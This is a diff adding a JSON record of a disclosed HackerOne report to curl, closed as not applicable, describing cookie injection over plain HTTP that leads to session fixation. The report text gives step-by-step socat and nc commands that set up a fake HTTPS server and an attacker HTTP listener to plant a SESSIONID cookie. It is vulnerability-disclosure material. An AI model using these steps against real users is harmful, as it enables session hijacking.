@@ -1,0 +1,114 @@
+{
+  "id": 1560324,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTYwMzI0",
+  "url": "https://hackerone.com/reports/1560324",
+  "title": "Cookie injection from non-secure context",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2022-05-05T17:48:16.307Z",
+  "submitted_at": "2022-05-05T17:48:16.396Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nyymi",
+    "url": "/nyymi",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-05-13T06:44:08.351Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-05-12T23:03:16.037Z",
+  "team_member_agreed_on_going_public_at": "2022-05-13T06:44:08.233Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nCurl allows injecting cookies over insecure HTTP connection that will then be sent to the target site when connecting over HTTPS.\n\nAs documented in lib/cookie.c https://github.com/curl/curl/blob/a04f0b961333e1a19848d073d8c7db9c20b2a371/lib/cookie.c#L1039 this should not be possible:\n```\n            /*\n             * A non-secure cookie may not overlay an existing secure cookie.\n             * For an existing cookie \"a\" with path \"/login\", refuse a new\n             * cookie \"a\" with for example path \"/login/en\", while the path\n             * \"/loginhelper\" is ok.\n             */\n```\n\nThis will allow session fixation (CWE-384) attack where the attacker replaces the session of the victim with their own. If the victim performs for example upload operations the upload will be sent to the account controlled bit he attacker.\n\nThis attack requires that the application in question does or  can be coaxed to make accesses to the same host over insecure HTTP connection. The attacker needs to either perform Man in the Middle attack to these insecure connections, or be able to host a HTTP server on another port on the same host.\n\n## Steps To Reproduce:\n1. Set up a HTTPS server that will respond to requests setting the SESSIONID cookie. This simulates the victim accessing the site normally. Note that the cookie has *secure* attribute:\n ```\necho -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=victimstoken; secure\\r\\nContent-Length: 0\\r\\n\\r\\n\" | socat STDIN OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem\n ```\n\n2. Access the site with curl to simulate a victim login:\n ```\n curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\n ```\n\n3. Simulate the attacker either performing a MitM attack or being able to host HTTP on another port on the same host:\n\n ```\n echo -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=hackerstoken; domain=somesite.tld\\r\\nContent-Length: 0\\r\\n\\r\\n\" | nc -v -l -p 3333\n ```\n\n4. Simulate the victim visiting the attacker controlled content:\n\n ```\n curl -c cookies.txt -b cookies.txt http://somesite.tld:3333/\n ```\n\n5. Start HTTPS server that will dump the Cookie headers sent by libcurl:\n ```\n socat OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem STDOUT\n ```\n\n6. Simulate the victim accessing the target site again:\n  ```\n curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\n ```\n\nThe following cookies are now sent by curl:\n`Cookie: SESSIONID=victimstoken; SESSIONID=hackerstoken`\n\nThe order the cookies appears to depend on the order of the lines in cookie store. Depending on how the victim site interpreted the multiple SESSIONID cookies the attacker may want to try to inject the cookie before login by the victim, or after the login.\n\nAfter successful attack the cookie.txt looks like this:\n```\n# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n.somesite.tld    TRUE    /       FALSE   0       SESSIONID       hackerstoken\nsomesite.tld     FALSE   /       TRUE    0       SESSIONID       victimstoken\n```\n\nThis is CWE-384: Session Fixation.\n\n## Impact\n\nCookie injection leading to CWE-384: Session Fixation and/or other similar attacks.",
+  "weakness": {
+    "id": 47,
+    "name": "Session Fixation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 2,
+  "voters": [
+    "zy9ard3",
+    "shivammusic"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
